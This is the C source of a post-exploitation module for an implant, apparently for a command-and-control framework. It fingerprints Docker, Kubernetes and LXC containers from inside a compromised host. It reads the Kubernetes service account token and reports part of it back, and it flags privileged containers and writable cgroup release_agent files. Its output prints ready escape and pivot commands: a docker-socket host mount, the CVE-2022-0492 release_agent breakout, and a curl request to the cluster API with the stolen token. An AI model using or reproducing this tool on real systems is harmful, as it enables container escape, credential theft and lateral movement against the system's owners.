/// container_detect.c — BOF: Container detection + escape/breakout hints
/// Compile: gcc -c -o container_detect.o container_detect.c -include bof_api.h -Os -fPIC
/// Usage: execute bof container_detect.o

struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

static int file_exists(const char *path) {
    unsigned int mode = 0;
    return (AxFileStat(path, &mode, (long *)0, (unsigned int *)0, (unsigned int *)0) == 0);
}

static int file_contains(const char *path, const char *needle) {
    char *data = (char *)0;
    int len = AxReadFileToBuffer(path, &data, 65536);
    if (len <= 0 || !data) return 0;
    int found = (AxStrstr(data, needle) != (char *)0);
    AxFree(data);
    return found;
}

static void check_docker(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== Docker ===\n");
    int is_docker = 0;

    if (file_exists("/.dockerenv")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] /.dockerenv exists\n");
        is_docker = 1;
    }

    if (file_contains("/proc/1/cgroup", "docker")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] /proc/1/cgroup contains 'docker'\n");
        is_docker = 1;
    }

    if (file_contains("/proc/1/cgroup", "/docker/")) {
        is_docker = 1;
    }

    // Check if we can see docker socket
    if (file_exists("/var/run/docker.sock")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!!] Docker socket accessible at /var/run/docker.sock\n");
        BeaconPrintf(CALLBACK_OUTPUT, "       ESCAPE: docker run -v /:/host --rm -it alpine chroot /host sh\n");
    }

    // Check if /proc/1/cgroup shows we're in a container
    if (!is_docker) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [-] No Docker indicators\n");
    } else {
        // Check for privileged mode
        char *status = (char *)0;
        int slen = AxReadFileToBuffer("/proc/1/status", &status, 8192);
        if (slen > 0 && status) {
            char *seccomp = AxStrstr(status, "Seccomp:");
            if (seccomp) {
                seccomp += 8;
                while (*seccomp == ' ' || *seccomp == '\t') seccomp++;
                if (*seccomp == '0') {
                    BeaconPrintf(CALLBACK_OUTPUT, "  [!!] Seccomp disabled — likely PRIVILEGED container\n");
                    BeaconPrintf(CALLBACK_OUTPUT, "       ESCAPE: mount host fs, nsenter, load kernel module\n");
                }
            }
            AxFree(status);
        }

        // Check for host PID namespace
        char *sched = (char *)0;
        int sc_len = AxReadFileToBuffer("/proc/1/sched", &sched, 4096);
        if (sc_len > 0 && sched) {
            // If PID 1 is not init/systemd, we see host processes
            if (AxStrstr(sched, "systemd") == (char *)0 &&
                AxStrstr(sched, "init") == (char *)0) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [!] PID 1 is not init/systemd — may share host PID namespace\n");
            }
            AxFree(sched);
        }

        // Check mounted devices
        char *mounts = (char *)0;
        int mt_len = AxReadFileToBuffer("/proc/mounts", &mounts, 131072);
        if (mt_len > 0 && mounts) {
            if (AxStrstr(mounts, "/dev/sd") || AxStrstr(mounts, "/dev/nvme") ||
                AxStrstr(mounts, "/dev/vd")) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [!] Block devices mounted — disk access possible\n");
            }
            AxFree(mounts);
        }

        // Check capabilities
        char *cap = (char *)0;
        int cap_len = AxReadFileToBuffer("/proc/1/status", &cap, 8192);
        if (cap_len > 0 && cap) {
            char *cap_eff = AxStrstr(cap, "CapEff:");
            if (cap_eff) {
                cap_eff += 7;
                while (*cap_eff == ' ' || *cap_eff == '\t') cap_eff++;
                // Full caps = 000001ffffffffff or higher
                if (AxStrstr(cap_eff, "0000003fffffffff") ||
                    AxStrstr(cap_eff, "000001ffffffffff") ||
                    AxStrstr(cap_eff, "0000003fffff")) {
                    BeaconPrintf(CALLBACK_OUTPUT, "  [!!] Full capabilities detected — PRIVILEGED\n");
                }
                char cap_val[32];
                int ci = 0;
                while (cap_eff[ci] && cap_eff[ci] != '\n' && ci < 31) {
                    cap_val[ci] = cap_eff[ci];
                    ci++;
                }
                cap_val[ci] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "  CapEff: %s\n", cap_val);
            }
            AxFree(cap);
        }
    }
}

static void check_kubernetes(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== Kubernetes ===\n");
    int is_k8s = 0;

    if (file_exists("/var/run/secrets/kubernetes.io/serviceaccount/token")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] K8s service account token found\n");
        is_k8s = 1;

        char *token = (char *)0;
        int tlen = AxReadFileToBuffer("/var/run/secrets/kubernetes.io/serviceaccount/token", &token, 8192);
        if (tlen > 0 && token) {
            // Show first/last 20 chars
            if (tlen > 40) {
                BeaconPrintf(CALLBACK_OUTPUT, "  Token: %.20s...%.20s (%d bytes)\n",
                             token, token + tlen - 20, tlen);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "  Token: %s\n", token);
            }
            AxFree(token);
        }

        char *ns = (char *)0;
        int ns_len = AxReadFileToBuffer("/var/run/secrets/kubernetes.io/serviceaccount/namespace", &ns, 256);
        if (ns_len > 0 && ns) {
            if (ns[ns_len - 1] == '\n') ns[ns_len - 1] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "  Namespace: %s\n", ns);
            AxFree(ns);
        }
    }

    // Check K8s env vars
    char val[256];
    if (AxGetEnv("KUBERNETES_SERVICE_HOST", val, sizeof(val)) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] KUBERNETES_SERVICE_HOST=%s\n", val);
        is_k8s = 1;
    }
    if (AxGetEnv("KUBERNETES_SERVICE_PORT", val, sizeof(val)) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] KUBERNETES_SERVICE_PORT=%s\n", val);
    }
    if (AxGetEnv("KUBERNETES_PORT", val, sizeof(val)) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] KUBERNETES_PORT=%s\n", val);
    }

    if (is_k8s) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [*] Pivot hints:\n");
        BeaconPrintf(CALLBACK_OUTPUT, "      - curl -sk https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'\n");
        BeaconPrintf(CALLBACK_OUTPUT, "      - Check RBAC: can-i list pods/secrets/configmaps\n");
        BeaconPrintf(CALLBACK_OUTPUT, "      - Look for overly permissive service accounts\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "  [-] No Kubernetes indicators\n");
    }
}

static void check_lxc(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== LXC/LXD ===\n");

    if (file_contains("/proc/1/cgroup", "lxc")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] LXC container detected (cgroup)\n");
    } else if (file_contains("/proc/1/environ", "container=lxc")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] LXC container detected (environ)\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "  [-] No LXC indicators\n");
    }
}

static void check_cgroup_escape(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== Cgroup escape checks ===\n");

    // Check if cgroup v1 release_agent is writable
    char *cgroup = (char *)0;
    int cg_len = AxReadFileToBuffer("/proc/1/cgroup", &cgroup, 4096);
    if (cg_len > 0 && cgroup) {
        BeaconPrintf(CALLBACK_OUTPUT, "  /proc/1/cgroup:\n");
        BeaconOutput(CALLBACK_OUTPUT, cgroup, cg_len);
        AxFree(cgroup);
    }

    // Check cgroupfs mount
    if (file_exists("/sys/fs/cgroup/memory/release_agent")) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [!!] release_agent exists — CVE-2022-0492 potential\n");
        BeaconPrintf(CALLBACK_OUTPUT, "       ESCAPE: echo 1 > /sys/fs/cgroup/.../notify_on_release; write release_agent\n");
    }

    // Check /proc/sysrq-trigger (privileged indicator)
    if (file_exists("/proc/sysrq-trigger")) {
        unsigned int mode = 0;
        AxFileStat("/proc/sysrq-trigger", &mode, (long *)0, (unsigned int *)0, (unsigned int *)0);
        if (mode & 0200) {  // writable
            BeaconPrintf(CALLBACK_OUTPUT, "  [!] /proc/sysrq-trigger is writable — privileged container\n");
        }
    }

    // Check core_pattern escape
    if (file_exists("/proc/sys/kernel/core_pattern")) {
        char *core = (char *)0;
        int core_len = AxReadFileToBuffer("/proc/sys/kernel/core_pattern", &core, 256);
        if (core_len > 0 && core) {
            if (core[0] == '|') {
                BeaconPrintf(CALLBACK_OUTPUT, "  [!] core_pattern uses pipe: %s", core);
            }
            AxFree(core);
        }
    }
}

void go(char *args, int args_len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Container detection + escape analysis\n");

    // General container check
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== General indicators ===\n");

    char val[256];
    if (AxGetEnv("container", val, sizeof(val)) > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] $container=%s\n", val);
    }

    // PID 1 check
    char *cmdline = (char *)0;
    int cl_len = AxReadFileToBuffer("/proc/1/cmdline", &cmdline, 256);
    if (cl_len > 0 && cmdline) {
        BeaconPrintf(CALLBACK_OUTPUT, "  PID 1: %s\n", cmdline);
        AxFree(cmdline);
    }

    // Detect type
    check_docker();
    check_kubernetes();
    check_lxc();
    check_cgroup_escape();

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Container analysis complete\n");
}
